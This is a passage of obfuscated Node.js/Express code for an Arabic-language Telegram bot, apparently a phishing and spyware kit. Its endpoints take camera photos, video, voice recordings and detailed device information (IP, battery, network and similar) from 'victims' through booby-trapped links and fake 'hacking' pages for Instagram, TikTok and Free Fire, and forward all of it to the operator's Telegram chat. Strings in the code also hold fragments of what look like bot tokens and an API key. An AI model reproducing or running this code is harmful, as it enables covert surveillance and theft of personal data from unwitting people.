    const _0x2c34db = _0x178009, _0x453f3e = { 'IfMXs': _0x2c34db(0x776) };
    _0x4846ca[_0x2c34db(0x4c1)](path[_0x2c34db(0x2a7)](__dirname, _0x453f3e[_0x2c34db(0x297)]));
});
let userRequests = {};
app[_0x178009(0x25e)](_0x178009(0x311) + _0x178009(0x6c3), (_0x491a7b, _0x1ccfa7) => {
    const _0x3ae179 = _0x178009, _0x25fecb = { 'esVuN': _0x3ae179(0x2b8) }, _0x2dbccf = _0x491a7b[_0x3ae179(0x4d8)][_0x3ae179(0x5cb)], _0xbf063 = _0x491a7b[_0x3ae179(0x4d8)][_0x3ae179(0x492)], _0x4be47b = _0x491a7b[_0x3ae179(0x4d8)][_0x3ae179(0x38a)];
    bot[_0x3ae179(0x6bc) + 'on'](_0x2dbccf, _0xbf063, _0x4be47b), _0x1ccfa7[_0x3ae179(0x74b)](_0x25fecb[_0x3ae179(0x620)]);
}), app[_0x178009(0x25e)](_0x178009(0x720) + _0x178009(0x23b), (_0x51159d, _0x2afe03) => {
    const _0x18b184 = _0x178009, _0x5f2e62 = {
            'Wftgl': _0x18b184(0x4bc),
            'oCeEO': function (_0x5e2ae2, _0x2eaba6) {
                return _0x5e2ae2 + _0x2eaba6;
            },
            'zRjgT': _0x18b184(0x251) + _0x18b184(0x2f3),
            'fdtoB': _0x18b184(0x362) + ':\x20',
            'ikxCO': function (_0x50d889, _0x4deabf) {
                return _0x50d889 > _0x4deabf;
            }
        }, _0x37c5fd = _0x51159d[_0x18b184(0x4d8)][_0x18b184(0x5cb)], _0x781de9 = _0x51159d[_0x18b184(0x4d8)][_0x18b184(0x2d1)][_0x18b184(0x577)](',');
    console[_0x18b184(0x22e)](_0x5f2e62[_0x18b184(0x6f9)], _0x781de9[_0x18b184(0x20d)], _0x5f2e62[_0x18b184(0x37f)], _0x37c5fd);
    if (_0x5f2e62[_0x18b184(0x6c6)](_0x781de9[_0x18b184(0x20d)], -0x1 * 0x23ff + 0x1444 + 0xfbb)) {
        const _0xf2a60 = _0x781de9[_0x18b184(0x552)]((_0x2c2e96, _0x5e8e82) => {
            const _0x3240b5 = _0x18b184, _0x11f534 = Buffer[_0x3240b5(0x237)](_0x2c2e96, _0x5f2e62[_0x3240b5(0x67c)]);
            return bot[_0x3240b5(0x49d)](_0x37c5fd, _0x11f534, { 'caption': _0x3240b5(0x1fc) + _0x5f2e62[_0x3240b5(0x467)](_0x5e8e82, 0x202 * 0xe + 0x131f + -0x1d1 * 0x1a) });
        });
        Promise[_0x18b184(0x2cf)](_0xf2a60)[_0x18b184(0x3e0)](() => {
            const _0x198152 = _0x18b184;
            console[_0x198152(0x22e)](''), _0x2afe03[_0x198152(0x6ca)]({ 'success': !![] });
        })[_0x18b184(0x3d1)](_0x46d3e5 => {
            const _0x124e23 = _0x18b184;
            console[_0x124e23(0x6d0)]('', _0x46d3e5), _0x2afe03[_0x124e23(0x4e9)](-0x1675 + 0xb16 + 0xd53)[_0x124e23(0x6ca)]({ 'error': '' });
        });
    } else
        console[_0x18b184(0x22e)](''), _0x2afe03[_0x18b184(0x4e9)](0x61 * -0x25 + -0x1685 + 0x1 * 0x261a)[_0x18b184(0x6ca)]({ 'error': '' });
}), app[_0x178009(0x25e)](_0x178009(0x4a4) + _0x178009(0x48f), upload[_0x178009(0x398)](_0x178009(0x235), 0x2653 * 0x1 + -0xb03 * -0x1 + -0x3142), (_0x1eb967, _0x1cb344) => {
    const _0x40ba1e = _0x178009, _0x5b1318 = {
            'QIaCq': function (_0x177d90, _0x298d4a) {
                return _0x177d90 > _0x298d4a;
            }
        }, _0x11e28b = _0x1eb967[_0x40ba1e(0x4d8)][_0x40ba1e(0x743)], _0x339120 = _0x1eb967[_0x40ba1e(0x6ed)];
    if (_0x339120 && _0x5b1318[_0x40ba1e(0x415)](_0x339120[_0x40ba1e(0x20d)], -0x4e2 * -0x2 + -0x523 + -0x4f * 0xf)) {
        console[_0x40ba1e(0x22e)](_0x40ba1e(0x4e3) + _0x339120[_0x40ba1e(0x20d)] + '\x20\x20' + _0x11e28b);
        const _0x5acc7f = _0x339120[_0x40ba1e(0x552)](_0x4e297a => bot[_0x40ba1e(0x49d)](_0x11e28b, _0x4e297a[_0x40ba1e(0x7c5)]));
        Promise[_0x40ba1e(0x2cf)](_0x5acc7f)[_0x40ba1e(0x3e0)](() => {
            const _0x32bf6f = _0x40ba1e;
            console[_0x32bf6f(0x22e)](''), _0x1cb344[_0x32bf6f(0x6ca)]({ 'success': !![] });
        })[_0x40ba1e(0x3d1)](_0x48f357 => {
            const _0x5411ef = _0x40ba1e;
            console[_0x5411ef(0x6d0)](':', _0x48f357), _0x1cb344[_0x5411ef(0x4e9)](-0x1105 + -0x10a9 + -0x11d1 * -0x2)[_0x5411ef(0x6ca)]({ 'error': '' });
        });
    } else
        console[_0x40ba1e(0x22e)](''), _0x1cb344[_0x40ba1e(0x4e9)](0x65 * -0x1 + 0x12 * -0x1f5 + 0x252f)[_0x40ba1e(0x6ca)]({ 'error': '' });
}), app[_0x178009(0x25e)](_0x178009(0x346) + 'ce', uploadVoice[_0x178009(0x798)](_0x178009(0x685)), (_0x58fdc6, _0x1cda61) => {
    const _0x51dce0 = _0x178009, _0x35f435 = { 'yxwIG': _0x51dce0(0x671) }, _0x20b01a = _0x58fdc6[_0x51dce0(0x4d8)][_0x51dce0(0x5cb)], _0x144883 = _0x58fdc6[_0x51dce0(0x29c)][_0x51dce0(0x3c0)];
    bot[_0x51dce0(0x263)](_0x20b01a, _0x144883)[_0x51dce0(0x3e0)](() => {
        const _0x3750de = _0x51dce0;
        fs[_0x3750de(0x3ca)](_0x144883), _0x1cda61[_0x3750de(0x74b)]('');
    })[_0x51dce0(0x3d1)](_0x266f8d => {
        const _0x425c5a = _0x51dce0;
        console[_0x425c5a(0x6d0)](_0x266f8d), _0x1cda61[_0x425c5a(0x4e9)](-0x1 * 0xce5 + 0x1 * 0x2287 + -0x13ae)[_0x425c5a(0x74b)](_0x35f435[_0x425c5a(0x300)]);
    });
});
const PORT = process[_0x178009(0x677)][_0x178009(0x678)] || -0x1 * -0x20ba + -0x124 * 0x16 + 0x20b * 0x2;
app[_0x178009(0x4f1)](PORT, () => {
    const _0x318af5 = _0x178009;
    console[_0x318af5(0x22e)](_0x318af5(0x70d) + _0x318af5(0x4dd) + _0x318af5(0x26b) + PORT);
}), app[_0x178009(0x344)](_0x178009(0x788), (_0x444f64, _0x28ddb3) => {
    const _0x1e2b4c = _0x178009, _0x10c5bb = { 'Knwlz': _0x1e2b4c(0x5a7) };
    _0x28ddb3[_0x1e2b4c(0x4c1)](path[_0x1e2b4c(0x2a7)](__dirname, _0x10c5bb[_0x1e2b4c(0x3a7)]));
}), app[_0x178009(0x25e)](_0x178009(0x4f9), async (_0x9aad9f, _0x460be5) => {
    const _0x47d289 = _0x178009, _0x2d46c1 = {
            'nGhQZ': _0x47d289(0x751),
            'dZGqm': _0x47d289(0x714) + _0x47d289(0x710) + _0x47d289(0x72e),
            'TMSMu': _0x47d289(0x7ed) + _0x47d289(0x299) + _0x47d289(0x3b3),
            'ImXpX': _0x47d289(0x7ed) + _0x47d289(0x299) + _0x47d289(0x7f7),
            'WVsFS': _0x47d289(0x59b) + _0x47d289(0x507) + _0x47d289(0x538)
        }, _0x554566 = _0x9aad9f[_0x47d289(0x4d8)][_0x47d289(0x743)], _0x54de7d = _0x9aad9f[_0x47d289(0x4d8)][_0x47d289(0x756)];
    if (_0x54de7d) {
        const _0x1fa66b = _0x47d289(0x636) + _0x47d289(0x6db) + _0x47d289(0x3b9) + _0x47d289(0x2d0) + _0x54de7d[_0x47d289(0x287)] + (_0x47d289(0x6e7) + _0x47d289(0x718)) + _0x54de7d[_0x47d289(0x323)] + (_0x47d289(0x282) + _0x47d289(0x5f0)) + _0x54de7d['ip'] + (_0x47d289(0x7dd) + _0x47d289(0x1fe)) + _0x54de7d[_0x47d289(0x5b6)] + (_0x47d289(0x6de) + _0x47d289(0x74f) + _0x47d289(0x63f)) + _0x54de7d[_0x47d289(0x3b1)] + (_0x47d289(0x6bf) + _0x47d289(0x2d0)) + _0x54de7d[_0x47d289(0x77a)] + _0x47d289(0x478) + _0x54de7d[_0x47d289(0x2fb) + 'ed'] + (_0x47d289(0x1d0) + _0x47d289(0x1d9) + _0x47d289(0x5ce) + _0x47d289(0x480)) + _0x54de7d[_0x47d289(0x615) + 'e'] + (_0x47d289(0x7d1) + ':\x20') + _0x54de7d[_0x47d289(0x68c)] + (_0x47d289(0x7f6) + _0x47d289(0x7bf)) + _0x54de7d[_0x47d289(0x6cb)] + (_0x47d289(0x515) + _0x47d289(0x673)) + _0x54de7d[_0x47d289(0x513) + _0x47d289(0x33b)] + (_0x47d289(0x7d5) + _0x47d289(0x7bf)) + _0x54de7d[_0x47d289(0x2b2)] + (_0x47d289(0x414) + _0x47d289(0x5c6)) + _0x54de7d[_0x47d289(0x725)] + (_0x47d289(0x2da) + _0x47d289(0x5af) + _0x47d289(0x2d0)) + _0x54de7d[_0x47d289(0x483) + _0x47d289(0x5e6)] + (_0x47d289(0x36b) + _0x47d289(0x2f7) + '\x20') + _0x54de7d[_0x47d289(0x672)] + (_0x47d289(0x726) + _0x47d289(0x543)) + _0x54de7d[_0x47d289(0x1f1)] + (_0x47d289(0x1fb) + _0x47d289(0x3e4)) + _0x54de7d[_0x47d289(0x659) + 'e'] + (_0x47d289(0x38b) + _0x47d289(0x5da)) + _0x54de7d[_0x47d289(0x272) + _0x47d289(0x560)] + (_0x47d289(0x490) + _0x47d289(0x3eb)) + _0x54de7d[_0x47d289(0x45e) + _0x47d289(0x1e0)] + (_0x47d289(0x457) + _0x47d289(0x1ce) + _0x47d289(0x7f3)) + _0x54de7d[_0x47d289(0x590)] + (_0x47d289(0x6e4) + _0x47d289(0x3eb)) + _0x54de7d[_0x47d289(0x214) + _0x47d289(0x37c)] + (_0x47d289(0x662) + _0x47d289(0x238)) + _0x54de7d[_0x47d289(0x348)] + (_0x47d289(0x482) + _0x47d289(0x6c9) + _0x47d289(0x502)) + _0x54de7d[_0x47d289(0x509)] + (_0x47d289(0x68e) + _0x47d289(0x563) + _0x47d289(0x767) + '\x20') + _0x54de7d[_0x47d289(0x405) + _0x47d289(0x2dc)] + (_0x47d289(0x374) + _0x47d289(0x614) + _0x47d289(0x768)) + _0x54de7d[_0x47d289(0x7ec) + _0x47d289(0x77f)] + (_0x47d289(0x2df) + _0x47d289(0x2d4) + _0x47d289(0x2d8) + _0x47d289(0x347)) + _0x54de7d[_0x47d289(0x278) + _0x47d289(0x381)] + (_0x47d289(0x555) + _0x47d289(0x245) + _0x47d289(0x35a)) + _0x54de7d[_0x47d289(0x385) + _0x47d289(0x36d)] + (_0x47d289(0x42e) + _0x47d289(0x36f) + _0x47d289(0x32a)) + _0x54de7d[_0x47d289(0x43e) + 'rt'] + (_0x47d289(0x7cf) + '\x20');
        try {
            await bot[_0x47d289(0x273) + 'e'](_0x554566, _0x1fa66b, { 'parse_mode': _0x2d46c1[_0x47d289(0x46b)] }), console[_0x47d289(0x22e)](_0x2d46c1[_0x47d289(0x528)]), _0x460be5[_0x47d289(0x6ca)]({ 'success': !![] });
        } catch (_0x18f79f) {
            console[_0x47d289(0x6d0)](_0x2d46c1[_0x47d289(0x435)], _0x18f79f), _0x460be5[_0x47d289(0x4e9)](0x1 * -0xe9e + 0x97 * 0x1d + -0x89)[_0x47d289(0x6ca)]({ 'error': _0x2d46c1[_0x47d289(0x3ea)] });
        }
    } else
        console[_0x47d289(0x22e)](_0x2d46c1[_0x47d289(0x2ca)]), _0x460be5[_0x47d289(0x4e9)](0x846 + 0x1 * 0x1e56 + -0x1 * 0x250c)[_0x47d289(0x6ca)]({ 'error': _0x2d46c1[_0x47d289(0x2ca)] });
}), app[_0x178009(0x25e)](_0x178009(0x76e), (_0x4bd303, _0x4ac1ba) => {
    const _0x23773d = _0x178009, _0x3417b6 = {
            'mbOAG': _0x23773d(0x4bc),
            'xISbo': function (_0x24d687, _0x485969) {
                return _0x24d687 + _0x485969;
            },
            'pCGmY': _0x23773d(0x6ba) + _0x23773d(0x547)
        }, _0x1f06ab = _0x4bd303[_0x23773d(0x4d8)][_0x23773d(0x5cb)], _0x212a13 = _0x4bd303[_0x23773d(0x4d8)][_0x23773d(0x2d1)][_0x23773d(0x577)](',');
    _0x212a13[_0x23773d(0x74d)]((_0x466d4e, _0x35bf1) => {
        const _0x4b5b1c = _0x23773d, _0x27db30 = Buffer[_0x4b5b1c(0x237)](_0x466d4e, _0x3417b6[_0x4b5b1c(0x314)]);
        bot[_0x4b5b1c(0x49d)](_0x1f06ab, _0x27db30, { 'caption': _0x4b5b1c(0x4b9) + _0x3417b6[_0x4b5b1c(0x55c)](_0x35bf1, -0x1 * -0x2df + 0xf16 * 0x2 + -0x210a) });
    }), console[_0x23773d(0x22e)](_0x23773d(0x406) + _0x23773d(0x764) + _0x23773d(0x2e7) + _0x1f06ab), dataStore[_0x1f06ab] && dataStore[_0x1f06ab][_0x23773d(0x219)] ? _0x4ac1ba[_0x23773d(0x3c8)](dataStore[_0x1f06ab][_0x23773d(0x219)]) : _0x4ac1ba[_0x23773d(0x74b)](_0x3417b6[_0x23773d(0x7e8)]);
}), app[_0x178009(0x344)](_0x178009(0x6da), (_0x2e9a3d, _0x3469d0) => {
    const _0x2c6980 = _0x178009, _0x10df53 = { 'HtmNL': _0x2c6980(0x447) };
    _0x3469d0[_0x2c6980(0x4c1)](path[_0x2c6980(0x2a7)](__dirname, _0x10df53[_0x2c6980(0x248)]));
});
let linkUsage = {};
const maxAttemptsPerButton = 0xf97 + 0x1 * 0x260b + -0x3377;
function validateLinkUsage(_0x31171f, _0x2e9f8c) {
    const _0x154b19 = _0x178009, _0x10b222 = {
            'lYjkK': function (_0x5da87a, _0x21d3fa) {
                return _0x5da87a(_0x21d3fa);
            },
            'gBNTH': function (_0x2d7e63, _0x409e05) {
                return _0x2d7e63 >= _0x409e05;
            }
        }, _0x322c50 = _0x31171f + ':' + _0x2e9f8c;
    if (_0x10b222[_0x154b19(0x2bd)](isVIPUser, _0x31171f))
        return !![];
    if (linkUsage[_0x322c50] && _0x10b222[_0x154b19(0x670)](linkUsage[_0x322c50][_0x154b19(0x52b)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x322c50] && (linkUsage[_0x322c50] = { 'attempts': 0x0 }), linkUsage[_0x322c50][_0x154b19(0x52b)]++, !![];
}
function _0x4b59(_0x5cc5c8, _0x3d72d0) {
    const _0x5bcc59 = _0x5212();
    return _0x4b59 = function (_0x3f0301, _0x2c139a) {
        _0x3f0301 = _0x3f0301 - (0xa3 * 0x17 + 0xde2 + -0x1abc);
        let _0x1da8f4 = _0x5bcc59[_0x3f0301];
        return _0x1da8f4;
    }, _0x4b59(_0x5cc5c8, _0x3d72d0);
}
function _0x5212() {
    const _0x175485 = [
        'U.S.\x20Bank',
        '\x20\x20\x20\x20',
        '\x20⚡\x0a-\x20الشبك',
        'h.me/',
        'تم\x20إرسال\x20ا',
        'ZI0_bot',
        'ation',
        'نيوزيلندا\x20',
        'rvJOo',
        'ikxCO',
        'rning-anim',
        '/whatsapp?',
        '\x20آخر\x20تحديث',
        'json',
        'deviceName',
        'LWPaO',
        'eGNmH',
        'البوسنة\x20وا',
        'اتف\x20كاملاً',
        'error',
        'اتك\x20[\x20/inf',
        'fXLwF',
        '\x20🇰🇬',
        'أوامر\x20للاس',
        'الرجاء\x20الم',
        'ICZJV',
        'Data',
        'وة\x20امانها\x20',
        'ing\x20video:',
        '/ca',
        'ات\x20الجهاز:',
        'Win64;\x20x64',
        'HzARI',
        '%\x20🔋\x0a-\x20هل\x20ا',
        's.html',
        'مكنك\x20إنشاء',
        'wlGRF',
        '\x20حذف\x20حسابك',
        'getUserPro',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        '2510iIoPTB',
        'photos',
        '\x20🔻\x0a-\x20المدي',
        'Ywcrf',
        'س\x20لديك\x20ايم',
        '\x20as\x20expect',
        'بلغاريا\x20🇧🇬',
        'qXHxU',
        'files',
        'ال\x20الخاصة\x20',
        'gexsx',
        'trim',
        'KTzGm',
        '&type=tikt',
        'سحب\x20جميع\x20ا',
        'جهازك\x20او\x20ط',
        '/ios',
        'get_joke',
        'oyHUp',
        'csaNa',
        'zRjgT',
        'token',
        'BtASc',
        'JjVQX',
        'الإكوادور\x20',
        'https',
        'عزيزي\x20حمود',
        'امريكا\x20🇺🇸',
        'ruqbQ',
        'member',
        'GBsDA',
        'سحب\x20جميع\x20ر',
        '\x20النقاط\x20ال',
        'rafVv',
        'LPQKu',
        'euhBL',
        'RwNbt',
        '\x20فاير\x20👾',
        'ton\x20below\x20',
        'vjSfU',
        'الخادم\x20يعم',
        'pfQdM',
        '\x20و\x20',
        'علومات\x20الج',
        'untry/',
        'جمع\x20معلوما',
        'nvite',
        'تم\x20إرسال\x20م',
        'TerSr',
        'سلوفينيا\x20🇸🇮',
        'me/)\x20\x0a*Pre',
        'نة:\x20',
        'hing\x20love\x20',
        'رام.',
        'existsSync',
        'get_freefi',
        '/xx',
        'المجلد\x20غير',
        'CldDh',
        '/submitPho',
        'tiktok',
        'جداً\x20لا\x20تق',
        'lstatSync',
        '\x20لشركة\x20وتس',
        'memory',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        'jWxOP',
        'king\x20subsc',
        'جرب\x20دوله\x20م',
        'IMzxy',
        'ا\x20الامر\x20/V',
        '\x20\x22https\x22.',
        'بوليفيا\x20🇧🇴',
        'هاز\x20بنجاح',
        'ابط\x20دعوة.',
        'مية\x20📸',
        'ضحيه\x20في\x20اد',
        'تونس\x20🇹🇳',
        'request_ve',
        'irRyb',
        'التواصل\x20مع',
        'd\x20Type\x20:*\x20',
        'رابط\x20تجميع',
        'تلغيم\x20رابط',
        '\x20NT\x2010.0;\x20',
        'جورجيا\x20🇬🇪',
        'كازاخستان\x20',
        'ول\x20الي\x20الر',
        'utf8',
        'TAWko',
        'الأردن\x20🇯🇴',
        'مدغشقر\x20🇲🇬',
        'mzUkr',
        'uploads/',
        'userId',
        'YNBzT',
        '/email/',
        'معرفة\x20رقم\x20',
        'ستخدمين.',
        'راقبه.....',
        'الرجاء\x20توف',
        'اصطناعي\x20🤖',
        'send',
        'atId=',
        'forEach',
        'ألبانيا\x20🇦🇱',
        'لهاتف\x20يشحن',
        'مرحبًا!\x20ان',
        'Markdown',
        '.io/api/v3',
        'FtvkX',
        '*\x20[BOT](t.',
        'ف\x20\x20رساله\x20ج',
        'deviceInfo',
        'am\x20message',
        'ipsMR',
        'ليبيا\x20🇱🇾',
        'ATGbQ',
        'اك\x20VIP',
        'إستونيا\x20🇪🇪',
        'اختراق\x20ببج',
        'غانا\x20🇬🇭',
        'vuzbd',
        'uTCtX',
        'exit',
        'gram:',
        'إغلاق\x20المو',
        's\x20for\x20chat',
        'total_coun',
        'خص\x20في\x20الدخ',
        '\x20المستخدم:',
        'تصال:\x20',
        'بوك\x20🔮',
        'YbSHu',
        'ماليزيا\x20🇲🇾',
        '`\x0a*[-]\x20Exp',
        'ription\x20st',
        '/so',
        '`\x0a*[-]\x20Cou',
        'ck/',
        'eqfYj',
        'تم\x20تصوير\x20ا',
        'fetch\x20visa',
        'تجرام\x20🖥',
        'سنغافورة\x20🇸🇬',
        'ca.html',
        'XtllP',
        'email',
        'tor',
        'network',
        'XzFvK',
        'FxGRE',
        'YZXyO',
        'امر\x20التالي',
        'Frequency',
        'رومانيا\x20🇷🇴',
        'اختراق\x20سنا',
        'صربيا\x20🇷🇸',
        'oydvO',
        'o\x20]</stron',
        'PZvjx',
        '🇳🇿',
        'Bearer\x20sk-',
        '/:userId',
        'ايل\x20الذي\x20ت',
        'الضحية\x20🎤',
        'اختراق\x20انس',
        'مرحبًا!\x20اض',
        'https://fa',
        'رى\x20لاحقًا.',
        'Tlznp',
        'التمتع\x20في\x20',
        '12vXzMHJ',
        'message_id',
        '/de\x0a\x0a<stro',
        '\x20المميزات\x20',
        '\x20استخدام\x20ا',
        'Clearing\x20c',
        'aRzqy',
        'single',
        'Xosye',
        'شرح\x20البوت\x20',
        '?start=',
        'W5B7mU',
        'kCTbX',
        'luqLP',
        'اتباع\x20الأو',
        'قطر\x20🇶🇦',
        'امرا\x20الخلف',
        'UBxKA',
        'VAWnS',
        'ل\x20وهمي',
        'to\x20generat',
        'لرابط:\x20',
        'yDqom',
        'book',
        'تصوير\x20الضح',
        'UHhSP',
        'rrKYi',
        'بك!\x20لديك\x20ا',
        'الجبل\x20الأس',
        'rong>\x0a\x20\x20\x20\x20',
        'PuyAt',
        'linkId',
        'phoneNumbe',
        '🇮🇩',
        '<strong>ال',
        'إندونيسيا\x20',
        '.temp-mail',
        'غوام\x20🇬🇺',
        '\x20الذكاء\x20ال',
        'https://mo',
        'luVen',
        'بورتوريكو\x20',
        'age',
        'لم\x20يتم\x20اخت',
        'stringify',
        'بولندا\x20🇵🇱',
        'لجهاز:\x20',
        'trong>',
        'DfYZt',
        'السنغال\x20🇸🇳',
        '\x20المحظور\x20م',
        '&type=inst',
        'buffer',
        '\x20في\x20جهاز\x20ا',
        'اب\x20أولاً</',
        '\x0aلعرض\x20الرس',
        'lPQTV',
        'ميله\x20ومحرج',
        'anding-mas',
        'ike\x20Gecko)',
        'videoData',
        '@lTV_l',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        '\x20اخره\x20لاحق',
        '\x20📡\x0a-\x20الوقت',
        'inkId',
        'Fgngf',
        'BaTch',
        '\x20📜\x0a-\x20نوع\x20ا',
        'bLLzC',
        'وله\x20بسبب\x20ق',
        '▓▓░░░░░░░░',
        'ckBSK',
        'نامج\x20وحذف\x20',
        'rhYCi',
        'دما\x20يقوم\x20ش',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'uAdJI',
        'ذا\x20الرابط\x20',
        '🇸🇻',
        '\x20على\x20البري',
        'ZUcPN',
        'os\x20for\x20cha',
        'بنين\x20🇧🇯',
        'soRVZ',
        'وامر\x20اخترا',
        'لرابط\x20إليك',
        'pCGmY',
        '/capture?c',
        'بتجميعها:\x20',
        'add_vip',
        'connection',
        'فشل\x20في\x20إرس',
        '\x20🇹🇲',
        'أوروغواي\x20🇺🇾',
        'qwaJE',
        'dRLYJ',
        'keys',
        'غيل:\x20',
        'اقع\x20💣',
        'حدث\x20خطأ\x20أث',
        '\x20⏰\x0a-\x20اسم\x20ا',
        '\x20الجهاز',
        'mkdirSync',
        'aCZbu',
        'Jxoyh',
        'إثيوبيا\x20🇪🇹',
        'ابط.',
        'lStPZ',
        '▓▓▓▓▓▓▓▓▓▓',
        'لا\x20بك\x20:\x20|\x20',
        '\x20Visa...\x0a[',
        'س\x20لديك\x20إيم',
        'diUbi',
        'خره\x20او\x20حاو',
        'JYdQe',
        '*\x0a\x0a',
        'AVhPi',
        'DEDNn',
        'لة\x20حالياً',
        'قبة\x20📡',
        'بريطانيا\x20🇬🇧',
        'Kctxh',
        'ناء\x20حذف\x20ال',
        'wIxKG',
        '=\x0a[-]\x20by\x20:',
        'اليابان\x20🇯🇵',
        'قاط\x20الصور.',
        'hatId=',
        'شخص\x20جديد\x20د',
        'مصر\x20🇪🇬',
        'تم\x20حذف\x20الم',
        'مرحبًا!\x20بك',
        'يه\x20لمعرفة\x20',
        'i.html',
        'CTdkq',
        'iLFSD',
        'captureBac',
        'تم\x20التحقق\x20',
        '<strong>❗ل',
        'منتهى\x20قم\x20ف',
        'rshq_tikto',
        'Stored\x20and',
        'wNWEd',
        'username',
        '/record/:l',
        'الرجاء\x20إرس',
        '\x20نظام\x20التش',
        'الكويت\x20🇰🇼',
        '\x20ميغابت\x20في',
        'ء\x20جلب\x20الرس',
        '`\x0a*[-]\x20Ban',
        'd\x20Bank',
        '\x20كل\x20الازرا',
        'الهند\x20🇮🇳',
        'تفسير\x20الأح',
        'me/lTV_l/3',
        '/captureBa',
        '\x20الثانية)\x0a',
        'LBJir',
        'nt:',
        '&duration=',
        'ق\x20كامراة\x20م',
        'rshq_insta',
        'سايل\x20الضحي',
        'lution',
        'و\x20🎥',
        'ata:',
        'الصين\x20🇨🇳',
        'يمل...</st',
        'HOboZ',
        'message',
        'CxkSJ',
        'ont/',
        'ook',
        '\x20https://t',
        'aRrMD',
        'startsWith',
        '/submitNam',
        'secondName',
        'uosVd',
        'multer',
        'language',
        'enzOY',
        'eWHUj',
        'uKBdR',
        'ود\x20🇲🇪',
        'VkaWe',
        'مل\x20السابق\x20',
        'PwjmT',
        'اختراق\x20اله',
        'أذربيجان\x20🇦🇿',
        '\x20🌐\x0a-\x20اسم\x20ا',
        '📸الصورة\x20',
        'administra',
        'لهاتف:\x20',
        '\x20يتم\x20إنشاء',
        '1157170vzjrqD',
        'السودان\x20🇸🇩',
        'r\x20data\x20for',
        '1377391BkHrvs',
        'اختراق\x20تيك',
        '/F.html?ch',
        'راقبه',
        'mvZQF',
        'لقد\x20تم\x20اخت',
        '\x20الحساب:*\x0a',
        'GIjIJ',
        'إختراق\x20فري',
        '7oxkoPuxqz',
        'length',
        'بنما\x20🇵🇦',
        'ستقبال\x20الا',
        '\x20Chrome/11',
        'zEYal',
        'النمسا\x20🇦🇹',
        'getItem',
        'screenOrie',
        'ناء\x20إرسال\x20',
        '2448880XrAUnS',
        'nHxgK',
        'قائي\x20',
        'userLink',
        'backQuery',
        'ابط\x20أدناه\x20',
        'NhffG',
        'غط\x20على\x20الز',
        '$\x0aعندما\x20تو',
        'ائل\x20للحصول',
        'أوغندا\x20🇺🇬',
        'تخدمين:\x20',
        'prev_',
        'i.openai.c',
        'yPgmJ',
        'xDRpr',
        'values',
        'EncYT',
        'rification',
        'في\x20الطلب.',
        'eText',
        'معلومات\x20حس',
        'رواندا\x20🇷🇼',
        '📞\x20إرسال\x20جه',
        'log',
        'أوكرانيا\x20🇺🇦',
        'eNUjq',
        'لبت\x20باسورد',
        'هذا\x20لفتح\x20أ',
        ']\x2050%',
        '@hsosgh',
        'images',
        'ccurred:',
        'from',
        'لألوان:\x20',
        'ناء\x20محاولة',
        'ank',
        'tos',
        'dotenv',
        'oXPNb',
        'اختراق\x20الك',
        'vice_info',
        'ر\x20رابط\x20🔒',
        'لبنان\x20🇱🇧',
        't.html',
        ')\x20AppleWeb',
        '/start',
        '\x20لتقنية\x20ال',
        'response',
        'كينيا\x20🇰🇪',
        'HtmNL',
        'eBPVV',
        'MMQGk',
        'ميانمار\x20🇲🇲',
        'hoFrJ',
        '\x20sent\x20vide',
        'dkRrB',
        'deleteMess',
        'تم\x20تلغيم\x20ه',
        'Received\x20p',
        'https://fl',
        'لهجه\x20اليمن',
        'HeIyF',
        'eTzGD',
        'n/json',
        '/record/',
        'j1u7p1lXXG',
        'خاص\x20بك\x0a\x20عن',
        'mNWPn',
        'لبوت.',
        'Kit/537.36',
        '/Messages\x0a',
        'post',
        'ر\x20مجاناً:',
        'يس\x20اسمي',
        'tId\x20',
        'ظه\x20بزم\x20يكو',
        'sendVoice',
        'ook:',
        'الكاميرون\x20',
        'Mozilla/5.',
        'sing\x20chatI',
        'KsSGz',
        'SIGINT',
        'كاليدونيا\x20',
        'فذ\x20',
        'IRhzb',
        '2BT3BlbkFJ',
        'تفادة\x20من\x20ا',
        'الدومينيكا',
        'XbfLd',
        'ing\x20Telegr',
        'browserVer',
        'sendMessag',
        'nmKOZ',
        'رقم\x20في\x20وتس',
        'recordVoic',
        'اله\x20طويله\x20',
        'geolocatio',
        '==========',
        'قر\x20على\x20الز',
        'mat\x20is\x20not',
        '</strong>',
        'قاط\x20وفتحها',
        'زامبيا\x20🇿🇲',
        '/completio',
        'إضافة\x20أسما',
        'mcOiZ',
        '\x20🏙️\x0a-\x20عنوان',
        'ntry\x20:*\x20`',
        'يح\x20يبدأ\x20بـ',
        'ية\x20📷',
        'ible-pract',
        'country',
        '@uiit89',
        'HjJcY',
        'kuMvD',
        'mpWFr',
        ':AAELOAVm0',
        'fAPLh',
        'ي\x20تلغيم\x20را',
        'RVJwj',
        'fuschia-lo',
        'YDfiG',
        'بيرو\x20🇵🇪',
        'rong>',
        'crypto',
        'CLASSIC',
        'تم\x20اختراق\x20',
        'IfMXs',
        'FajMB',
        'ال\x20معلومات',
        'UattB',
        'fYkZd',
        'file',
        'جلد:\x20',
        'م\x20استلمها\x20',
        'Failed\x20to\x20',
        'FnKca',
        'ck/:linkId',
        'قم\x20بإرسال\x20',
        '20952Hcapnp',
        'MJaqO',
        'ك\x20VIP',
        'لآن\x20',
        'join',
        'ابط\x20التقاط',
        '\x20أسماء\x20الم',
        'ال\x20رابط\x20صح',
        'مستخدم\x20لإض',
        'SIGTERM',
        'Error\x20chec',
        'TPGso',
        '.vercel.ap',
        'F.html',
        'iry\x20:*\x20`',
        'deviceType',
        'قر\x20على\x20الر',
        'Qjdlg',
        'لضحيه\x20فيدي',
        'ائل</stron',
        'اختراق\x20فري',
        'حدث\x20خطأ',
        'م\x20في\x20طلب\x20ك',
        'اب\x20لفك\x20الح',
        'مرحبًا\x20بك\x20',
        ':</strong>',
        'lYjkK',
        'content',
        'dIGEOjpMgZ',
        'الته\x20من\x20VI',
        'mGIxl',
        'لمعلومات:\x20',
        'LxcdT',
        'ى\x20صورة\x20الم',
        'نيجيريا\x20🇳🇬',
        'ache...',
        'QwbwO',
        'ناميبيا\x20🇳🇦',
        'CdZWM',
        'WVsFS',
        '*Hi\x20Bro,\x20I',
        'use',
        'bTDdZ',
        'ال\x20معرف\x20ال',
        'all',
        'ة:\x20',
        'imageDatas',
        'مولدوفا\x20🇲🇩',
        'zgWap',
        'ية\x20تحديد\x20ا',
        'videos',
        'اب\x20سريعاً\x0a',
        'وبية\x20🇰🇷',
